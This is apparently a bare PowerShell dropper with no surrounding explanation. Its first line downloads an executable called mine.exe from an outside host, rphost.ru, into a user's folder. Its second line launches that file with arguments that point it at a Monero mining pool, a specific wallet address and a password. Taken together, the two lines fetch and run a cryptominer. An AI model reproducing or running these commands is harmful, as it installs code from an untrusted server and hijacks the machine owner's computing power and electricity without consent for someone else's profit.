(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/mine.exe","C:\Users\Admin\mine.exe")
start-process -FilePath 'C:\Users\Admin\mine.exe' -ArgumentList "-o pool.supportxmr.com:3333 -u 4Ahg96ZKa14MkPbqN3mFBH4EYJp2KBwwY61GtZTN5zCDiGT2dNDnkTXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm43Nf7Yn -p TEST"
